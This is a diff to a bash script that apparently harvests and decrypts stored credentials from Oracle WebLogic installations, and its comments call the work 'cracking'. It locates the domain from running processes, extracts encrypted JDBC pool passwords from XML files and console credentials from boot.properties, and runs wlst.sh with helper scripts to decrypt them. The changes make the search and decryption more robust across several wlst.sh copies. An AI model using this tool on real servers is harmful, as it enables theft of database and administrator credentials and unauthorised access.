@@ -16,11 +16,11 @@ if [ "${sdomain}" = "" ];
 then
   tmp=`ps -ef|grep java|grep -Eo "(home=[^ ]+)"|sed  's/home=//g'|sed 's/\/wlserver.*$//g'|sort -u|head -n 1`;
   sdomain=`find ${tmp} -type d -name "domains"|grep 'user_projects'`
-  cd "${domains}";
+  cd "${sdomain}";
   cd "user_projects";
   cd "domains";
   sdomain=`pwd`
-  wlst=`find ${tmp} -type f -name "wlst.*"|sort -u`
+  wlst=(`echo ${sdomain}|sed 's/^\///g'|sed 's/\/.*//g'|xargs -I %  find /% -type f -name "wlst.sh"|sort -u`)
 fi
 
 # 精准找到wlst.*， 用于破解jdbc连接池密码
@@ -45,6 +45,11 @@ enPswd=`find ${sdomain} -type f -name "*jdbc*.xml"|xargs -I {} cat {}|grep -Eo "
 if [ "${enPswd}" = "" ];
 then
    enPswd=`echo ${sdomain}|sed 's/\/server.*//g'|xargs -I {}  find {}  -type f -name "*jdbc*.xml"|xargs -I {} cat {}|grep -Eo "<password-encrypted>([^<]+)<\/password-encrypted>"|sort -u|sed -E 's/<[^<>]+?>//g'`
+fi
+
+if [ "${enPswd}" = "" ];
+then
+   enPswd=`echo ${sdomain}|sed 's/\/user_projects\/.*$/\/user_projects/g'|xargs -I {}  find {}  -type f -name "*jdbc*.xml"|xargs -I {} cat {}|grep -Eo "<password-encrypted>([^<]+)<\/password-encrypted>"|sort -u|sed -E 's/<[^<>]+?>//g'`
 fi
 
 if [ "${enPswd}" != "" ];
@@ -79,7 +84,12 @@ except:
     raise
 EOT
 echo "jdbc连接池密码..."
-${wlst}  ${tmpFl}  ${sdomain} "${enPswd}"
+
+for i in ${wlst[@]}
+do
+  ${i} ${tmpFl}  ${sdomain} "${enPswd}"
+done
+
 fi
 
 
@@ -106,7 +116,12 @@ for i in range(1, len(sys.argv)):
 
 EOT
 echo "开始破解weblogic console 用户名及密码"
-find `echo $DOMAIN_HOME|sed 's/base_domain//g'`/ -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"|xargs ${wlst} ./xxx.py
+set +e
+for i in ${wlst[@]}
+do
+  find `echo $DOMAIN_HOME|sed 's/base_domain//g'`/ -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"|xargs ${i} ./xxx.py
+done
+# find `echo $DOMAIN_HOME|sed 's/base_domain//g'`/ -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"|xargs ${wlst} ./xxx.py
 rm -rf ./xxx.py
 
 # 获取jdbc配置信息
